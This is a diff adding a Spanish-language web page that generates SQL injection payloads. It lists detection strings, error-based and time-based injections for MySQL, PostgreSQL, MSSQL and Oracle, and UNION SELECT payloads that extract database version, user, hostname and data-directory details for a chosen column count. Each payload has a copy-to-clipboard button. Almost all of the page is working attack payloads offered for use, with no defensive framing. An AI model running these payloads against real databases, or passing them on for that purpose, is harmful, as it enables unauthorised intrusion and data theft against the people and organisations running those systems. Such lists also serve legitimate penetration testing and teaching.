@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Generador Payloads SQLi Básicos</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <style>
+        /* Estilos personalizados */
+        body {
+            background-color: #f8f9fa;
+        }
+        .payload-code {
+            background-color: #e9ecef;
+            padding: 0.2rem 0.4rem;
+            border-radius: 0.2rem;
+            font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+            word-break: break-all; /* Evitar desbordamiento */
+            margin-right: 0.5rem;
+        }
+        .payload-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid #dee2e6;
+        }
+        .payload-item:last-child {
+            border-bottom: none;
+        }
+        .copy-btn {
+            flex-shrink: 0; /* Evitar que el botón se encoja */
+        }
+        #resultsArea {
+            margin-top: 2rem;
+        }
+         /* Estilo para feedback de copia */
+        .copied-feedback {
+            font-size: 0.8em;
+            color: green;
+            margin-left: 5px;
+            display: inline-block; /* Para que se vea junto al botón */
+            opacity: 0;
+            transition: opacity 0.5s ease-out;
+        }
+        .copied-feedback.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <header class="bg-dark text-white text-center py-3 mb-4">
+        <h1>Generador de Payloads SQL Injection Básicos (Error/Union)</h1>
+    </header>
+
+    <main class="container">
+
+        <!-- Payloads de Detección Básicos -->
+        <section class="mb-4">
+            <div class="card">
+                <div class="card-header">
+                    Payloads de Detección Iniciales
+                </div>
+                <div class="card-body" id="detectionPayloadsContainer">
+                    <!-- Los payloads de detección se cargarán aquí por JS -->
+                </div>
+            </div>
+        </section>
+
+        <!-- Formulario de Configuración -->
+        <section class="mb-4">
+            <div class="card">
+                <div class="card-header">
+                    Configuración de Generación
+                </div>
+                <div class="card-body">
+                    <form id="payloadForm">
+                        <div class="row g-3">
+                            <div class="col-md-6">
+                                <label for="dbTypeSelect" class="form-label">Tipo de Base de Datos:</label>
+                                <select class="form-select" id="dbTypeSelect" required>
+                                    <option value="generic" selected>Genérico / Desconocido</option>
+                                    <option value="mysql">MySQL</option>
+                                    <option value="pgsql">PostgreSQL</option>
+                                    <option value="mssql">MSSQL</option>
+                                    <option value="oracle">Oracle</option>
+                                </select>
+                            </div>
+                            <div class="col-md-6">
+                                <label for="columnCountInput" class="form-label">Nº Columnas (para UNION):</label>
+                                <input type="number" class="form-control" id="columnCountInput" min="1" placeholder="Ej: 3">
+                            </div>
+                        </div>
+                        <div class="mt-3 d-flex justify-content-end gap-2">
+                             <button type="button" class="btn btn-warning" id="resetBtn">Limpiar</button>
+                             <button type="submit" class="btn btn-primary" id="generateBtn">Generar Payloads</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </section>
+
+        <!-- Área de Resultados -->
+        <section id="resultsArea" style="display: none;">
+            <hr>
+            <h2 id="resultsTitle" class="mt-4 mb-3">Resultados Generados</h2>
+
+            <div class="card mb-4">
+                <div class="card-header">
+                    Payloads Basados en Error
+                </div>
+                <div class="card-body" id="errorPayloads">
+                    <p class="text-muted">No se han generado payloads basados en error.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    Payloads UNION SELECT
+                </div>
+                 <div class="card-body" id="unionPayloads">
+                    <p class="text-muted">Introduce el número de columnas para generar payloads UNION.</p>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Bootstrap JS Bundle (incluye Popper) -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+
+    <!-- JavaScript de la Aplicación -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- REFERENCIAS AL DOM ---
+            const detectionPayloadsContainer = document.getElementById('detectionPayloadsContainer');
+            const payloadForm = document.getElementById('payloadForm');
+            const dbTypeSelect = document.getElementById('dbTypeSelect');
+            const columnCountInput = document.getElementById('columnCountInput');
+            const generateBtn = document.getElementById('generateBtn');
+            const resetBtn = document.getElementById('resetBtn');
+            const resultsArea = document.getElementById('resultsArea');
+            const resultsTitle = document.getElementById('resultsTitle');
+            const errorPayloadsContainer = document.getElementById('errorPayloads');
+            const unionPayloadsContainer = document.getElementById('unionPayloads');
+
+            // --- DATOS DE PAYLOADS ---
+            const detectionPayloads = [
+                "'", "\"", "`", "\\", "' OR 1=1 -- ", "\" OR 1=1 -- ",
+                "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 'x'='x",
+                "' AND 1=1 -- ", "\" AND 1=1 -- ", "' AND '1'='1",
+                "1' ORDER BY 1 -- ", "1' ORDER BY 100 -- ", // Para detectar columnas
+                "1 UNION SELECT NULL -- " // Básico para empezar UNION
+            ];
+
+            const errorPayloadTemplates = {
+                generic: [
+                    "'", "\"", "`", "\\",
+                    "' AND 1=0 -- ", "\" AND 1=0 -- ",
+                    "' AND (SELECT 1)=1 -- ", "\" AND (SELECT 1)=1 -- ",
+                    "' WAITFOR DELAY '0:0:5' -- ", // Común en MSSQL, puede funcionar en otros
+                    "' OR SLEEP(5) -- " // Común en MySQL/PostgreSQL
+                ],
+                mysql: [
+                    "'", "\"", "`", "\\",
+                    "' AND 1=1 -- ", "' AND 1=0 -- ",
+                    "' AND (SELECT 1 FROM information_schema.tables LIMIT 1) -- ", // Intenta acceder a schema
+                    "' AND GTID_SUBSET(SLEEP(5),1) -- ", // Error-based Blind Time
+                    "' OR SLEEP(5) -- ",
+                    "' AND extractvalue(rand(),concat(0x3a,version())) -- ", // Error-based v5.1+
+                    "' AND updatexml(rand(),concat(0x3a,version(),0x3a),null) -- ", // Error-based v5.1+
+                    "' OR 1 GROUP BY concat_ws(0x3a,version(),floor(rand(0)*2)) HAVING min(0) -- " // Error double query
+                ],
+                pgsql: [
+                    "'", "\"", "`", "\\",
+                    "' AND 1=1 -- ", "' AND 1=0 -- ",
+                    "' AND CAST(1 AS numeric)=1 -- ", "' AND CAST(1 AS text)=1 -- ",
+                    "' AND 1=(SELECT 1) -- ",
+                    "' AND pg_sleep(5) -- ",
+                    "'; SELECT pg_sleep(5) --", // Stacked query
+                    "' AND 1=cast(version() as int) -- ", // Fuerza error de casteo
+                    "' AND 1=cast(user as int) -- "
+                ],
+                mssql: [
+                    "'", "\"", "`", "\\",
+                    "' AND 1=1 -- ", "' AND 1=0 -- ",
+                    "' AND 1=@@VERSION -- ", // Intenta obtener versión
+                    "'; WAITFOR DELAY '0:0:5' -- ", // Stacked query time delay
+                    "' WAITFOR DELAY '0:0:5' -- ", // Time delay
+                    "' AND 1=(SELECT count(*) FROM sys.objects) -- ", // Acceso a sys tables
+                    "' HAVING 1=1 -- " // A veces revela errores
+                ],
+                oracle: [
+                    "'", "\"", "`", "\\",
+                    "' AND 1=1 -- ", "' AND 1=0 -- ",
+                    "' AND 1=1 FROM dual -- ", "' AND 1=0 FROM dual -- ",
+                    "' AND 1=(SELECT 1 FROM dual) -- ",
+                    "' AND 1=(SELECT user FROM dual) -- ",
+                    "' AND 1=(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%') -- ",
+                    "' AND 1=utl_inaddr.get_host_name -- ", // Provoca error o revela hostname
+                    "' AND 1=ctxsys.drithsx.sn(1,user) -- " // Error-based
+                ]
+            };
+
+            // Funciones generadoras para UNION SELECT
+            const unionPayloadGenerators = {
+                generic: (numCols) => {
+                    if (numCols < 1) return [];
+                    const nulls = Array(numCols).fill('NULL').join(',');
+                    const numbers = Array.from({ length: numCols }, (_, i) => i + 1).join(',');
+                    return [
+                        `' UNION SELECT ${nulls} -- `,
+                        `" UNION SELECT ${nulls} -- `,
+                        `-1 UNION SELECT ${nulls} -- `,
+                        `' UNION SELECT ${numbers} -- `, // Para ver qué columna se refleja
+                        `" UNION SELECT ${numbers} -- `,
+                        `-1 UNION SELECT ${numbers} -- `
+                    ];
+                },
+                mysql: (numCols) => {
+                    if (numCols < 1) return [];
+                    const basePayloads = unionPayloadGenerators.generic(numCols);
+                    const nulls = Array(numCols).fill('NULL');
+
+                    // Intenta colocar información común en diferentes posiciones
+                    const infoPayloads = [];
+                    const commonInfo = ['version()', 'database()', 'user()', '@@datadir', '@@hostname'];
+                    if (numCols >= commonInfo.length) {
+                         const payload = [...commonInfo, ...Array(numCols - commonInfo.length).fill('NULL')];
+                         infoPayloads.push(`' UNION SELECT ${payload.join(',')} -- `);
+                    } else if (numCols > 0) {
+                        for (let i = 0; i < commonInfo.length; i++) {
+                            const payload = [...nulls];
+                            payload[i % numCols] = commonInfo[i];
+                            infoPayloads.push(`' UNION SELECT ${payload.join(',')} -- `);
+                        }
+                         // Combinar las 3 primeras si hay espacio
+                        if(numCols >= 3) {
+                           const payload = [...nulls];
+                           payload[0] = 'version()';
+                           payload[1] = 'database()';
+                           payload[2] = 'user()';
+                           infoPayloads.push(`' UNION SELECT ${payload.join(',')} -- `);
+                        } else if(numCols >= 2) {
+                            const payload = [...nulls];
+                           payload[0] = 'version()';
+                           payload[1] = 'user()';
+                           infoPayloads.push(`' UNION SELECT ${payload.join(',')} -- `);
+                        }
+                    }
+                    // Añadir payload común con información agrupada si es posible
+                    if (numCols > 0) {
+                        const concatPayload = [...nulls];
+                        concatPayload[0] = `concat_ws(0x3a, user(), database(), version())`;
+                        infoPayloads.push(`' UNION SELECT ${concatPayload.join(',')} -- `);
+                    }
+
+
+                    return [...new Set([...basePayloads, ...infoPayloads])]; // Evitar duplicados
+                },
+                pgsql: (numCols) => {
+                    if (numCols < 1) return [];
+                    const basePayloads = unionPayloadGenerators.generic(numCols);
+                    const nulls = Array(numCols).fill('NULL'); // PostgreSQL usa NULL
+                    const textNulls = Array(numCols).fill("''::text"); // A veces se necesita casteo
+
+                    const infoPayloads = [];
+                    const commonInfo = ['version()', 'current_database()', 'user', 'session_user', 'inet_server_addr()::text'];
+                     if (numCols >= commonInfo.length) {
+                         const payload = [...commonInfo, ...Array(numCols - commonInfo.length).fill('NULL')];
+                         infoPayloads.push(`' UNION SELECT ${payload.map(p => `${p}::text`).join(',')} -- `); // Castear a texto es común
+                    } else if (numCols > 0) {
+                        for (let i = 0; i < commonInfo.length; i++) {
+                            const payload = [...textNulls];
+                            payload[i % numCols] = `${commonInfo[i]}::text`;
+                            infoPayloads.push(`' UNION SELECT ${payload.join(',')} -- `);
+                        }
+                         // Combinar las 3 primeras si hay espacio
+                        if(numCols >= 3) {
+                           const payload = [...textNulls];
+                           payload[0] = 'version()::text';
+                           payload[1] = 'current_database()::text';
+                           payload[2] = 'user::text';
+                           infoPayloads.push(`' UNION SELECT ${payload.join(',')} -- `);
+                        }
+                    }
+                     // Añadir payload común con información agrupada si es posible
+                    if (numCols > 0) {
+                        const concatPayload = [...textNulls];
+                        concatPayload[0] = `concat_ws(':', version()::text, current_database()::text, user::text)`;
+                        infoPayloads.push(`' UNION SELECT ${concatPayload.join(',')} -- `);
+                    }
+
+                    return [...new Set([...basePayloads, ...infoPayloads])];
+                },
+                 mssql: (numCols) => {
+                    if (numCols < 1) return [];
+                    const basePayloads = unionPayloadGenerators.generic(numCols);
+                    const nulls = Array(numCols).fill('NULL').join(',');
+
+                    const infoPayloads = [];
+                    const commonInfo = ['@@version', 'db_name()', 'user_name()', 'SYSTEM_USER', '@@SERVERNAME'];
+                     if (numCols >= commonInfo.length) {
+                         const payload = [...commonInfo, ...Array(numCols - commonInfo.length).fill('NULL')];
+                         infoPayloads.push(`' UNION SELECT ${payload.join(',')} -- `);
+                    } else if (numCols > 0) {
+                        for (let i = 0; i < commonInfo.length; i++) {
+                            const payload = Array(numCols).fill('NULL');
+                            payload[i % numCols] = commonInfo[i];
+                            infoPayloads.push(`' UNION SELECT ${payload.join(',')} -- `);
+                        }
+                        // Combinar las 3 primeras si hay espacio
+                        if(numCols >= 3) {
+                           const payload = Array(numCols).fill('NULL');
+                           payload[0] = '@@version';
+                           payload[1] = 'db_name()';
+                           payload[2] = 'user_name()';
+                           infoPayloads.push(`' UNION SELECT ${payload.join(',')} -- `);
+                        }
+                    }
+
+                    return [...new Set([...basePayloads, ...infoPayloads])];
+                },
+                 oracle: (numCols) => {
+                    if (numCols < 1) return [];
+                    const basePayloads = unionPayloadGenerators.generic(numCols); // Incluye NULLs
+                    const nullsFromDual = ` FROM dual -- `;
+                    const nulls = Array(numCols).fill('NULL').join(',');
+
+                    // Añadir 'FROM dual' necesario en Oracle
+                    const oracleBase = basePayloads.map(p => p.replace(/ -- $/, nullsFromDual));
+
+                    const infoPayloads = [];
+                     // Nota: En Oracle, todas las columnas del SELECT deben tener el mismo tipo de dato
+                     // O castear explícitamente. Usar TO_CHAR es lo más seguro.
+                    const commonInfo = [
+                        "(SELECT banner FROM v$version WHERE ROWNUM=1)",
+                        "(SELECT user FROM dual)",
+                        "(SELECT global_name FROM global_name)",
+                        "(SELECT instance_name FROM v$instance)",
+                        "NULL" // Añadir NULL para asegurar compatibilidad
+                    ];
+
+                    if (numCols > 0) {
+                         for (let i = 0; i < commonInfo.length -1; i++) { // Iterar sobre info real
+                            const payload = Array(numCols).fill('NULL');
+                            payload[i % numCols] = `TO_CHAR(${commonInfo[i]})`; // Castear a CHAR
+                            infoPayloads.push(`' UNION SELECT ${payload.join(',')} FROM dual -- `);
+                        }
+                        // Combinar las 3 primeras si hay espacio y castear
+                        if(numCols >= 3) {
+                           const payload = Array(numCols).fill('NULL');
+                           payload[0] = `TO_CHAR(${commonInfo[0]})`;
+                           payload[1] = `TO_CHAR(${commonInfo[1]})`;
+                           payload[2] = `TO_CHAR(${commonInfo[2]})`;
+                           infoPayloads.push(`' UNION SELECT ${payload.join(',')} FROM dual -- `);
+                        } else if (numCols >= 2) {
+                            const payload = Array(numCols).fill('NULL');
+                            payload[0] = `TO_CHAR(${commonInfo[0]})`;
+                           payload[1] = `TO_CHAR(${commonInfo[1]})`;
+                            infoPayloads.push(`' UNION SELECT ${payload.join(',')} FROM dual -- `);
+                        }
+                    }
+
+
+                    return [...new Set([...oracleBase, ...infoPayloads])];
+                }
+            };
+
+            // --- FUNCIONES AUXILIARES ---
+
+            /**
+             * Muestra una lista de payloads en el contenedor especificado.
+             * @param {string[]} payloads Array de strings de payloads.
+             * @param {HTMLElement} container Elemento HTML donde mostrar los payloads.
+             * @param {string} emptyMessage Mensaje si no hay payloads.
+             */
+            const displayPayloads = (payloads, container, emptyMessage = "No hay payloads para mostrar.") => {
+                container.innerHTML = ''; // Limpiar contenedor
+                if (!payloads || payloads.length === 0) {
+                    container.innerHTML = `<p class="text-muted">${emptyMessage}</p>`;
+                    return;
+                }
+
+                payloads.forEach(payload => {
+                    const div = document.createElement('div');
+                    div.className = 'payload-item';
+
+                    const codeSpan = document.createElement('span');
+                    const codeElement = document.createElement('code');
+                    codeElement.className = 'payload-code';
+                    codeElement.textContent = payload;
+                    codeSpan.appendChild(codeElement);
+
+                    const button = document.createElement('button');
+                    button.type = 'button';
+                    button.className = 'btn btn-sm btn-outline-secondary copy-btn';
+                    button.textContent = 'Copiar';
+                    button.setAttribute('data-payload', payload); // Guardar payload en el botón
+                    button.setAttribute('aria-label', `Copiar payload: ${payload}`);
+
+                    // Elemento para feedback de copia
+                    const feedbackSpan = document.createElement('span');
+                    feedbackSpan.className = 'copied-feedback';
+                    feedbackSpan.textContent = '¡Copiado!';
+
+                    div.appendChild(codeSpan);
+                    const buttonWrapper = document.createElement('div'); // Contenedor para botón y feedback
+                    buttonWrapper.appendChild(button);
+                    buttonWrapper.appendChild(feedbackSpan);
+                    div.appendChild(buttonWrapper);
+
+                    container.appendChild(div);
+                });
+            };
+
+             /**
+             * Muestra feedback visual brevemente al copiar.
+             * @param {HTMLElement} button El botón que fue clickeado.
+             */
+             const showCopyFeedback = (button) => {
+                 const feedback = button.nextElementSibling; // Asume que el feedback span es el siguiente hermano
+                 if (feedback && feedback.classList.contains('copied-feedback')) {
+                    feedback.classList.add('show');
+                    setTimeout(() => {
+                        feedback.classList.remove('show');
+                    }, 1500); // Ocultar después de 1.5 segundos
+                 }
+             };
+
+            // --- MANEJADORES DE EVENTOS ---
+
+            // Generar Payloads
+            payloadForm.addEventListener('submit', (event) => {
+                event.preventDefault(); // Prevenir envío real del formulario
+
+                const dbType = dbTypeSelect.value;
+                const columnCount = parseInt(columnCountInput.value, 10);
+                const isValidColumnCount = !isNaN(columnCount) && columnCount > 0;
+
+                // Actualizar título de resultados
+                resultsTitle.textContent = `Resultados Generados (${dbType.toUpperCase()}${isValidColumnCount ? ', ' + columnCount + ' cols' : ''})`;
+
+                // Generar y mostrar payloads de error
+                const errorPayloads = errorPayloadTemplates[dbType] || errorPayloadTemplates.generic;
+                displayPayloads(errorPayloads, errorPayloadsContainer, `No hay payloads de error específicos para ${dbType.toUpperCase()}. Mostrando genéricos.`);
+
+                // Generar y mostrar payloads UNION
+                if (isValidColumnCount) {
+                    const generator = unionPayloadGenerators[dbType] || unionPayloadGenerators.generic;
+                    const unionPayloads = generator(columnCount);
+                     displayPayloads(unionPayloads, unionPayloadsContainer, `No se pudieron generar payloads UNION para ${columnCount} columnas.`);
+                } else {
+                    unionPayloadsContainer.innerHTML = '<p class="text-muted">Introduce un número válido de columnas (mayor que 0) para generar payloads UNION.</p>';
+                }
+
+                resultsArea.style.display = 'block'; // Mostrar área de resultados
+                resultsArea.scrollIntoView({ behavior: 'smooth' }); // Scroll suave a los resultados
+            });
+
+            // Limpiar Formulario y Resultados
+            resetBtn.addEventListener('click', () => {
+                payloadForm.reset(); // Resetea los campos del formulario a sus valores iniciales
+                dbTypeSelect.value = 'generic'; // Asegurar valor por defecto del select
+                columnCountInput.value = ''; // Limpiar input numérico
+                resultsArea.style.display = 'none'; // Ocultar resultados
+                errorPayloadsContainer.innerHTML = '<p class="text-muted">No se han generado payloads basados en error.</p>';
+                unionPayloadsContainer.innerHTML = '<p class="text-muted">Introduce el número de columnas para generar payloads UNION.</p>';
+            });
+
+            // Copiar al Portapapeles (Usando Delegación de Eventos)
+            document.body.addEventListener('click', (event) => {
+                // Verificar si el elemento clickeado es un botón de copiar
+                if (event.target.classList.contains('copy-btn')) {
+                    const button = event.target;
+                    const payloadToCopy = button.getAttribute('data-payload');
+
+                    if (payloadToCopy && navigator.clipboard) {
+                        navigator.clipboard.writeText(payloadToCopy)
+                            .then(() => {
+                                console.log('Payload copiado:', payloadToCopy);
+                                showCopyFeedback(button); // Mostrar feedback visual
+                            })
+                            .catch(err => {
+                                console.error('Error al copiar al portapapeles:', err);
+                                alert('Error al copiar. Asegúrate de estar en un contexto seguro (HTTPS o localhost).');
+                            });
+                    } else if (!navigator.clipboard) {
+                         alert('La API del portapapeles no está disponible en este navegador o contexto.');
+                    }
+                }
+            });
+
+
+            // --- INICIALIZACIÓN ---
+            // Mostrar payloads de detección iniciales al cargar la página
+            displayPayloads(detectionPayloads, detectionPayloadsContainer);
+
+        }); // Fin DOMContentLoaded
+    </script>
+
+</body>
+</html>
